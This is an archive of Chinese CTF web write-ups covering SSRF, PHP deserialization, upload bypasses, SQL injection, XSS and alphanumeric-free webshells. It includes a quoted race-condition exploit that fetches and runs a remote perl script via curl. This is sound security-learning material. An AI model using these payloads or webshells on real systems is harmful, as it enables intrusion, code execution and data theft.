，然后看见有一张无法解析的图片返回来，而且没有图片包同时发过来，猜测是ssrf利用，尝试一下访问file://www.ichunqiu.com/var/www/html/flag.php 然后就有flag了这里其实考到了一个parse_url解析url的一个漏洞点，当parse_url解析http://u:p@a.com:80@b.com 的时候，会匹配最后一个@后面符合格式的host，所以解析出来的host是b.com，因此可以在匹配ichunqiu的地址的同时可以访问到其他站点附上原题源码1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include \"flag.php\";echo \"you need to login as admin!\";echo \"&lt;!-- post param 'admin' --&gt;\";if(isset($_POST['admin']))&#123; if($_POST['admin']==1)&#123; if($_SERVER['HTTP_X_CLIENT_IP'])&#123; if(isset($_POST['url']) &amp;&amp; parse_url($_POST['url'])['host']=='www.ichunqiu.com')&#123; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_POST['url']); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $content = curl_exec($curl); curl_close($curl); $filename='download/'.rand().';img1.jpg'; file_put_contents($filename,$content); echo $_POST['url']; $img=\"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; echo $img; &#125; else&#123; echo \"you need post url: http://www.ichunqiu.com\"; &#125; &#125; else&#123; echo \"only 127.0.0.1 can get the flag!!\"; &#125; &#125;&#125;else&#123; $_POST['admin']=0;&#125; web2这题进去什么都没有，然后先扫一下后台源码什么的，发现index.php有源码泄露，将文件下下来恢复一下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(\"/[&lt;&gt;*;|?\\n ]/\",\"\",$str); $str=str_replace('flag','',$str); return $str; &#125; function echo($host)&#123; system(\"echo $host\"); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"echo\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1)&#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===\"doller\")&#123; @parse_str($_GET['a']); if($var===\"give\")&#123; if($bbb===\"me\")&#123; if($ccc===\"flag\")&#123; echo \"&lt;br&gt;welcome!&lt;br&gt;\"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo \"&lt;br&gt;think about it&lt;br&gt;\";&#125; &#125; else&#123; echo \"NO\"; &#125;&#125;else&#123; echo \"Can you hack me?&lt;br&gt;\";&#125; 可以看到，主要是在反序列化漏洞的利用，但是我们利用的时候会自动触发wakeup函数进行waf的检查，所以我们需要绕过他的waf，同时也看到echo函数有个system，因此可以进行命令注入序列化对象的利用12345$a = new come(\"echo\",array(\"`cat\\$&#123;IFS&#125;/flflagag`\"));$b = serialize($a);echo $b;echo \"&lt;br&gt;\";echo urlencode($b); 到了这里，就剩最后bbb、ccc那些的匹配了，注意&amp;要url编码 web3题目进去就给了源码12345678910111213141516171819202122232425262728&lt;?php//error_reporting(0);//$dir=md5(\"icq\" . $_SERVER['REMOTE_ADDR']);$dir=md5(\"icq\");$sandbox = '/var/sandbox/' . $dir;@mkdir($sandbox);@chdir($sandbox);if($_FILES['file']['name'])&#123; $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name']; if (!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(\"emmmm...\"); &#125; $new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $_ = $_POST['hehe']; if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name);&#125;else&#123; highlight_file(__FILE__);&#125; 首先可以看到对于不是数组的filename进行了一堆严格的限制，但是没有对数组进行限制，所以我们可以考虑用数组进行绕过，要求filename的end和filename的[count-1]不能相等，所以我们考虑这样绕过123456array(2) &#123; [1]=&gt; string(1) \"abc\" [2]=&gt; string(3) \"php\"&#125; 这样的话，$ext = php，$filename[count(filename)-1] = abc，就能饶过限制了然后就是文件的上传了12$new_name = (string)rand(100,999).\".\".$ext;move_uploaded_file($_FILES['file']['tmp_name'],$new_name); 这两行导致了文件名不可控，但是我们可以通过目录穿越，传一个文件名为../../../../../../tmp/aaa.php的文件上去，就可以控制文件名了1234$_ = $_POST['hehe'];if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_);&#125; 这两行限制了上传的文件前六位必须是@&lt;?php，而且文件名字不能包含$new_name，但是问题不大，因为我们现在已经可以任意传我们想要的内容，轻松绕过好吧，然后就能执行文件内容了最终数据包的内容123456789101112131415161718192021----------------------------1234567890Content-Disposition: form-data; name=\"hehe\"Content-Type: application/octet-stream/tmp/aaa.php----------------------------1234567890Content-Disposition: form-data; name=\"file[1]\"Content-Type: application/octet-streamabc----------------------------1234567890Content-Disposition: form-data; name=\"file[2]\"Content-Type: application/octet-stream../../../../../../tmp/aaa.php----------------------------1234567890Content-Disposition: form-data; name=\"a.php\"Content-Type: application/octet-stream@&lt;?php echo `cat /flag`;?&gt;----------------------------1234567890 web4这题进去是一个后台登录框，在select_guest处可以进行sql注入，imformation_schema.???被ban了，但是可以用information_schema . tables去绕过，select,union,from被替换成空格，然后进行回显注入就行了注出来管理员的密码拿去爆破一下就进入后台了，要求传去./flag.php，接下来就是文件上传的漏洞在数据包里面可以看到有个uploaddir和filename，所以猜测最终的文件名是uploaddir+filename，但是我们上传文件的时候会自动加上txt的后缀，所以要想办法截断，一般的%00,%0a,#,%09最后发现%02能截断……12345678910111213141516171819----------------------------1234567890Content-Disposition: form-data; name=\"action\"submit----------------------------1234567890Content-Disposition: form-data; name=\"fileField\"; filename=\"p \"Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;----------------------------1234567890Content-Disposition: form-data; name=\"uploaddir\"Content-Type: application/octet-stream./flag.ph----------------------------1234567890Content-Disposition: form-data; name=\"button\"xxx----------------------------1234567890","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/06/2018上海市大学生信息安全竞赛web题解/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"百度杯 ctf 九月场","date":"2018-10-30T16:00:00.000Z","path":"2018/10/31/百度杯-ctf-九月场/","text":"发现还有这堆题没刷，刷一刷，记一下 Test这题是海洋cms的前台getshell漏洞，百度一下就能看到一堆的解释，翻一翻看见其实是利用了一个eval函数的漏洞，因为对客户端的输入过滤不严，导致可以执行任意代码，具体利用在search.php的页面可以看到，我们确实可以执行任意代码，接下来我们用菜刀连过去看下数据库的信息最后连接数据库就能看到flag了 123这题进去看到一个login.php，看下源码可以看见但是访问下user.php没有信息，猜测是源码泄露，扫一下果然看见了.swp有个文件下来，点开看到一堆人名，用burpsuite暴力跑一下密码，成功登入结果看到一个空页面，什么操作？？好的，源码看到这个鬼东西，就是文件上传漏洞了，去掉注释发个php文件，emmm，不能包含php，尝试一下php3,php4,php5,pht,phtml这些，最后发现pht可以绕过这里他会检测文件的内容，所以想写php是不可能的了，但是成功传了文件发现居然给回来一条链接view.php，提示file?猜测是读取文件，试下在后面加一个file=flag，果然触发waf了，试下重复下名字，好了，成功了 SQLI这题其实进去会发现302重定向了，然后原来的网页有个l0gin.php注入点在原来的页面，在后面加个l0gin.php就能看到真正的注入页面了，这题其实就是一般的回显的注入，只是过滤了逗号，所以要用个join去构造payload1' union select * from (select database()) from information_schema.tables ) a join (select version() ) b %23 1' union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23 1' union select * from (select group_concat(distinct(table_name)) from information_schema.tables where table_schema='sqli') a join (select version() ) b %23 1' union select * from (select group_concat(distinct(column_name)) from information_schema.columns where table_name='users') a join (select version() ) b %23 1' union select * from (select flag_9c861b688330 from users) a join (select version() ) b %23 SQL这题进去可以看到提示flag在数据库里面，尝试一下在id后面加union、select等字符，发现会触发waf，尝试一下sel&lt;&gt;ect进行绕过，成功，接下来就是注入了注入很简单，普通的回显注入1234?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,database(),3#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,group_concat(table_name),3 from information_schema.tables where table_schema='sqli'#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,group_concat(column_name),3 from information_schema.columns where table_schema='sqli'#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,flAg_T5ZNdrm,3 from info# 这题很奇怪，flag是拿到了，但是提交确实答案错误，喵喵喵？？？ 再见cms这道题题目很明显，就是在考cms的漏洞，首先我们先确定好是什么cms好吧，谷歌一波发现是齐博的cms，来一篇离别歌大佬的博客https://bugs.leavesongs.com/php/%E9%BD%90%E5%8D%9A%E6%95%B4%E7%AB%99-%E5%9C%B0%E6%96%B9%E9%97%A8%E6%88%B7sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/然后我们就去利用啦，首先注册个账号，然后去userinfo.php进行注入先寻找注入点12http://246ec0b9b99b49e0b389942159f82cedd0c28f2815984231.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select version()) where uid=3 %23 然后我们刷新一下个人主页，确实是有版本号回显的好了，找到注入点就能进行注入了1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(table_schema)) from information_schema.tables) where uid=3 %23 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(table_name)) from information_schema.tables where table_schema=database()) where uid=3 %23 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(column_name)) from information_schema.columns where table_name = (select distinct(table_name) from information_schema.tables where table_schema = database() limit 1) ) where uid = 3 %23 到了这里，我们突然发现，数据库里居然没有flag的信息，大胆猜测，可能是/var/www/html/flag.php所以就用load_file进行注入，发现flag会被ban，那就换成十六进制1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870) ) where uid = 3 %23","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/31/百度杯-ctf-九月场/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"xss challenge 刷题记录","date":"2018-10-28T16:00:00.000Z","path":"2018/10/29/xss-challenge-刷题记录/","text":"很久以前学了xss，但是没有系统的刷过题，前几天看国际赛的题目有几题xss的题目，感觉还是不是很熟，干脆找个平台来做一做。这个是一个日本人写的平台，http://xss-quiz.int21h.jp/ ，边做边记下 Challenge 1emmm，会点html和js都能秒过，完全是裸题，直接在输入框输入1&lt;script&gt;alert(document.domain);&lt;/script&gt; 就能过了 Challenge 2还是水题，源码看见有个双引号，闭合一下就能进行触发了，1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; Challenge 3这题注入点不是在输入框，是在国家，改下包就行了 Challenge 4这题会对符号进行转义，闭合一下前面的，然后插入代码 Challenge 5这题限制了输入长度，可以在前端页面改一下maxlength，也可以直接抓包改，然后还是能弹的 Challenge 6这题闭合一下前面的值，加个onmouseover属性就能触发了 Challenge 7这题跟上一题差不多，过滤了&lt;&gt;，还是可以继续用onmouseover去触发，图基本一样，就不放了 Challenge 8这题提示了javascript sheme，scheme 属性设置或返回用于解释 content 属性的值的格式。在连接插入js伪链接然后弹窗 Challenge 9这题转义了&lt;&gt;”，正确的解法应该是utf-7编码，然后再去输入弹窗，但是我找不到thf-7转码工具，然后用上一题的方法也能苟过去，佛辣 Challenge 10这关可以看到，过滤了domian，但是我们可以通过重复关键词去进行绕过1\"&lt;script&gt;alert(document.domadomainin);&lt;/script&gt; Challenge 11这关对script和on开头的字符串都进行了过滤，也就是说script和onmouseover还有onclick都是不行的，所以只能用a标签去试一下1\"&gt;&lt;a href=\"javascript:alert(document.domain);\"&gt;&lt;/a&gt; 但是script是被过滤了，不过可以用一个unicode编码去进行绕过，最终payload：1\"&gt;&lt;a href=javascri&amp;#09pt:alert(document.domain)&gt;test&lt;/a&gt; Challenge 12“s/[\\x00-\\x20\\&lt;>\\”\\’]//g;”，这个过滤有丶真实，&lt;&gt;”‘，0x00到0x20之间的符号也会被过滤掉emmm，网上的wp都说1``onmouseover=alert(document.domain);&gt; 可以绕过，但是要在ie的浏览器下，肉鸡电脑没有ie，苟过去了苟过去了（逃 Challenge 13这题提示了style attribute，可以在CSS样式中利用expression去实现javascript中的onmouseover或者onmouseout事件，但是也是要ie（版本8以下）…………1aa:expression(onmouseover=function()&#123;alert(document.domain)&#125;) 还有另一种方式，利用background去修改css样式1background-color:#ff0000;background:url(\"javascript:alert(document.domain);\"); 但是也复现不了，不知道为什么…… Challenge 14提示s/(url|script|eval|expression)/xxx/ig;，可以看到script和expression都是被过滤了的，但是其实可以在中间引入注释符，然后成功绕过，利用实体字符进行编码绕过是不行的，过滤了&amp;，但是进行unicode是可以的，最后的payload其实跟上一题差不多，但是有个问题，也是要ie浏览器123aa:exp/**/ression(onmouseover=function()&#123;alert(document.domain)&#125;)aa:expre\\0ssion(onmouseover=function()&#123;alert(document.domain)&#125;)aa:expr\\0056ssion(onmouseover=function()&#123;alert(document.domain)&#125;) Challenge 15利用document.write去写入javascript，但是转义了&lt;&gt;，可以用十六进制去进行绕过，最后payload1\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Challenge 16这题跟上一题考点一样，但是提示看到了\\\\x会转成\\\\\\\\x，所有十六进制绕过是不行的了，尝试一下unicode编码1\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e 也可以八进制1\\\\74img src=x onerror=alert(document.domain)\\\\76 Challenge 17这题跟宽字节注入有点像，将双引号吞了，然后进行注入，但是这个有个要求，要在老ie（6以下版本）才能进行1p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7 吞掉p1后面的引号就可以让p1第一个引号和p2的第一个引号闭合起来，然后后面再插入我们的代码，弹个domain，最后再把p2第二个引号闭合起来，就可以实现注入了 Challenge 18这题的操作有点骚，因为对”&lt;&gt;都进行了转义，所以我们要对他们进行处理，先看”的十六进制：00100010，&gt;的十六进制：00101110，&lt;的十六进制：00111100，然后我们将最高位全部换成1，也就是10100010、10111110、10111100，转化过来就是%A2、%BE、%BC，最后的payload就是1%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE 但是这个也是有个前提，要在ie6以下才能成功 Challenge 19这题可以找到原来的漏洞https://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-something.html但是我去实现的时候总是返回404页面，看大佬的博客看见火狐是不能返回的，要用ie8，溜了溜了，颓了颓了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/29/xss-challenge-刷题记录/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://xi4or0uji.github.io/tags/xss/"}]},{"title":"hacklu 2018 Baby PHP","date":"2018-10-26T16:00:00.000Z","path":"2018/10/27/hacklu-2018-Baby-PHP/","text":"这个比赛只有两道web题，一题代码审计，另一题神仙题？？贼少人做……….这篇博客先只讲一题，另一题用另一篇博客讲 题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 &lt;?phprequire_once('flag.php');error_reporting(0);if(!isset($_GET['msg']))&#123; highlight_file(__FILE__); die();&#125;@$msg = $_GET['msg'];if(@file_get_contents($msg)!==\"Hello Challenge!\")&#123; die('Wow so rude!!!!1');&#125;echo \"Hello Hacker! Have a look around.\\n\";@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc)&#123; die(\"lol no\\n\");&#125;if(strlen($k2) == $bb)&#123; if(preg_match('/^\\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125;list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = \"2\";$a=\"‮b\";//;1=bif($$a !== $k1)&#123; die(\"lel no\\n\");&#125;// plz die nowassert_options(ASSERT_BAIL, 1);assert(\"$bb == $cc\");echo \"Good Job ;)\";// TODO// echo $flag; 这题把所有绕过都绕了就解出来了，考了很多个点，下面一个个解释 绕过file_get_contents可以看到get方法获得一个msg，然后去读名字为msg的文件，如果内容是Hello Challenge!那就能进入下一步，否则就退出程序这里可以用php://input去进行绕过，用我们写入的值作为内容，然后就能绕过了 key1源码要求获得的key1转成int型要能等于1337，又要key1与1337不能相等，这里用字符串就能绕过了key1=’1337’ key2key2的长度必须是42，而且key2满足以$结尾，同时不是数字这里可以用一个长度为42的以美元符号结尾的字符串去绕过，key2=’000000000000000000000000000000000001337＄’，这样构造一个符合规则的key2方便我们后面可以利用cc substr和sha1可以看到，这里的条件如果可以满足的话，我们就可以进行变量覆盖，也会多了可控的值这里想要两边都是true是不可能的了，只能让他两边同时为falsesubstr：这个函数只能处理字符串，如果给他一个数组的话，那就会返回nullsha1：很巧的是，这个函数也是处理数组的时候出错会返回一个null两边同时为null，恰好可以满足条件，进去下一步 $a !== $k1这里第一行的代码倒了过来，应该是 $b = “2”; $a = “b”; // ;1 = b这是一个小的trick，https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick所以a的值其实是2，因此我们上一步进行变量覆盖的时候可以将k1赋值为2 assert_options这个考到了assert这些函数，看下官方解释，http://php.net/manual/en/function.assert-options.php这里利用assert(“$bb == $cc”);我们可以用 // 注释掉后面的 == $aa”，然后再插入函数，读出flag，也就是assert(“show_source(‘flag.php’); // == $cc”)至此，完成了整个代码的绕过了，最终payload?msg=php://input&amp;key1=1337&amp;k1=2&amp;key2=000000000000000000000000000000000001337%ef%bc%84&amp;cc[]=&amp;bb=show_source(‘flag.php’);//Hello Challenge!","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/27/hacklu-2018-Baby-PHP/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"hitcon 2018 One Line PHP Challenge","date":"2018-10-24T16:00:00.000Z","path":"2018/10/25/hitcon-2018-One-Line-PHP-Challenge/","text":"前段时间打了个神仙比赛，全程挂机，tqltql这里记录一下复现好吧题目很简单，就一行这题看过去没有什么头绪，后来看到wp才知道原来是考session的漏洞。 session的问题php检查session是否要处理是通过session.auto_start或者session_start()，但是默认情况下session.auto_start的Off的，而代码如果没有session_start()也是没有开启session的，但是如果用PHP_SESSION_UPLOAD_PROGRESS在多部分POST数据里就可以开启session了这里我建了个php文件去测试，我在html文件夹下放了一个123.php，里面什么代码都没有，然后在linux shell里面输入下面的语句123456789$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh'$ ls -a /var/lib/php/sessions. ..$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh' -d 'PHP_SESSION_UPLOAD_PROGRESS=blabalbal'$ ls -a /var/lib/php/sessions. ..$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh' -F 'PHP_SESSION_UPLOAD_PROGRESS=blabalbal' -F 'file=@/etc/passwd'$ ls -a /var/lib/php/sessions. .. sess_hhh 可以看到，确实是有一个session是hhh。 session会被清除的问题但是这里还有个问题，我们在自己的Linux上测试是可以保存了session文件的，但是hitcon可不可以保存session文件呢开发手册可以看见，cleanup默认是开启的，所以我们想将session文件保留下来，就要用到条件竞争，或者上传一个很大的文件去一直保留进度，让session一直存活。 session的利用好了，到了现在，我们可以保证session里面肯定是有一个文件是我们自己上传进去的了，现在我们来看下那个文件好的，upload_progress后面的是可控的，但是还有一个问题，我们想要去掉前面的upload_progress怎么办呢，这里就要用到base64的容错了 base64容错利用我们知道，base64只会解密[a-zA-Z0-9]，但是，如果里面有不合法的字符的时候，他还是可以把正确的字符连接在一起去进行加密的举个栗子看个代码123456789101112$i = 0 ;$data = \"upload_progress_ZZ\";while(true)&#123; $i += 1; $data = base64_decode($data); var_dump($data); echo '&lt;br&gt;'; if($data == '')&#123; echo \"解密次数: \".$i.\"\\n\"; break; &#125;&#125; 可以看见，加了两个字母以后，upload_progress在经过三次解密后就没有了，所以我们想改掉前缀只需要对信息base64加密三次传输就行了最后给个orange师傅的exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import sysimport stringimport requestsfrom base64 import b64encodefrom random import sample, randintfrom multiprocessing.dummy import Pool as ThreadPoolHOST = 'http://54.250.246.238/'sess_name = 'iamorange'headers = &#123; 'Connection': 'close', 'Cookie': 'PHPSESSID=' + sess_name&#125;payload = '@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'while 1: junk = ''.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if '=' not in x and '=' not in xx and '=' not in xxx: payload = xxx print payload breakdef runner1(i): data = &#123; 'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z' &#125; while 1: fp = open('/etc/passwd', 'rb') r = requests.post(HOST, files=&#123;'f': fp&#125;, data=data, headers=headers) fp.close()def runner2(i): filename = '/var/lib/php/sessions/sess_' + sess_name filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename # print filename while 1: url = '%s?orange=%s' % (HOST, filename) r = requests.get(url, headers=headers) c = r.content if c and 'orange' not in c: print [c]if sys.argv[0] == '1': runner = runner1else: runner = runner2pool = ThreadPool(32)result = pool.map_async( runner, range(32) ).get(0xffff) 好了好了，总的来说这题考了条件竞争，session漏洞，base64容错机制，溜了溜了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/25/hitcon-2018-One-Line-PHP-Challenge/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"一个php的小trick：file_put_contents","date":"2018-10-22T16:00:00.000Z","path":"2018/10/23/一个php的小trick：file_put_contents/","text":"这里给个pwnhub的简化版的题123456789101112&lt;?phpfunction is_valid($title, $data)&#123; $data = $title . $data; return preg_match('|\\A[ _a-zA-Z0-9]+\\z|is', $data);&#125;$title = $_GET['title'];$data = $_GET['data'];if (!is_valid($title,$data))&#123; exit(\"no!no!no!\");&#125;file_put_contents('a.php',$data); 先解释一下代码，传过来的title和data两个值拼接在一起，然后去匹配正则表达式，只能有字母、数字、空格和下划线，如果匹配成功，就使用file_put_contents将data的内容写进去a.php文件可是我们想写一个马进去，至少也是要有?这些字符的，这里就利用到php的一个trick了 先来个官网介绍可以看见，filename是要被写入数据的文件名；data是写入的数据，类型可以是string，array；data可以是数组，但是不能是多维数组，相当于file_put_contents（$filename,join(‘’,$array)），如果第二个参数传入的是数组，则它们会以字符串的形式拼接起来 这里有个可以利用的地方就是，我们第二个参数可以传入一个数组，这样在进行正则拼接的时候，数组会强制转化成字符串，也就是会变成$title.Array，这样当然是可以符合规则的，所以就可以绕过正则的限制了，而且很秀的是，刚刚好file_put_contents是可以执行数组的最后的payload： 1?title=s&amp;data[]=&lt;?php%0a&amp;data[]=phpinfo(); 最后我们可以看见，a.php确实写进了phpinfo()，至此，我们就可以利用这个漏洞写个马了 最后补一句，其实这个漏洞在fopen(),fwrite(), fclose()也是存在的","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/23/一个php的小trick：file_put_contents/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"没有字母数字获得webshell","date":"2018-10-18T16:00:00.000Z","path":"2018/10/19/没有字母数字获得webshell/","text":"基础版获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。先给个题好吧1234&lt;?phpif (!preg_match('/[A-Za-z0-9]/is',$_GET['shell']))&#123; eval($_GET['shell']);&#125; 可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办 方法一php有个trick，两个非字母的字符异或在一起可以产生一个字母，所以我们就可以这样去绕过了首先用个assert函数去获得shell，这里注意一点是，php7以前，assert是一个函数，可以通过$a=’assert’;$a(xxxx)这样去动态执行代码，但是到了php7就不行了，下面还会给到php7的方法好吧，不慌 php5先看一下这样一串代码12345&lt;?php$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]); 通过异或获得字母然后执行phpinfo() php7这里可以直接用原本的eval函数就行123&lt;?php$_=('%8F'^'%FF').('%7F'^'%17').('%8F'^'%FF').('%7F'^'%16').('%35'^'%5B').('%5B'^'%3D').('%34'^'%5B');$_(); 方法二利用取反进行操作，汉字的utf-8编码提取其字符再取反，例如’来’{1}取反就是b所以payload就是12345678&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');//这里是两个true相加，就是1+1$_=$__/$__;//2除2$____='';$___=\"瞰\";$____.=~($___&#123;$_&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"的\";$____.=~($___&#123;$_&#125;);$___=\"半\";$____.=~($___&#123;$_&#125;);$___=\"始\";$____.=~($___&#123;$__&#125;);$_____='_';$___=\"俯\";$_____.=~($___&#123;$__&#125;);$___=\"瞰\";$_____.=~($___&#123;$__&#125;);$___=\"次\";$_____.=~($___&#123;$_&#125;);$___=\"站\";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);//assert($_POST[2]) 故2=xxx即可执行任意代码 方法三在php里面，字符++可以得到下一个字符，举个栗子：’a’++=&gt;’b’，’b’++=&gt;’c’那么怎么能有个字母呢，数组的在php里面是array，如果我们echo ‘[]’，是可以得到ARRAY的，又因为在php里面大小写是不敏感的，所以问题就解决了12345678910111213141516171819202122232425262728293031323334$_=[];$_=@\"$_\"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 升级版好了，简单版的是这样的，如果后台加多个限制，不给用$和_，而且还不准超过35个字符怎么办123456789101112if(isset($_GET['shell']))&#123; $code = $_GET['shell']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; 在php7里面，(‘phpinfo’)();这样是可以执行函数的，所以只要改一下里面的phpinfo，还是可以执行任意函数漏洞的，但是不给用字母，根据上面的思路，我们可以对ascii码取个反，继续执行payload1(~%8F%97%8F%96%91%99%90)(); 但是在php5里面不能像php7一样动态执行函数怎么办呢跳一下出去，不局限在php里面，直接去执行linux也是可以的 1?&gt;&lt;?=`. /???/??????;`?&gt; 如果有多个文件想要特别匹配的话，可以[^x]表示不匹配x，[0-9]表示这个位置的字符是0-9之间的，这样就可以特意匹配了 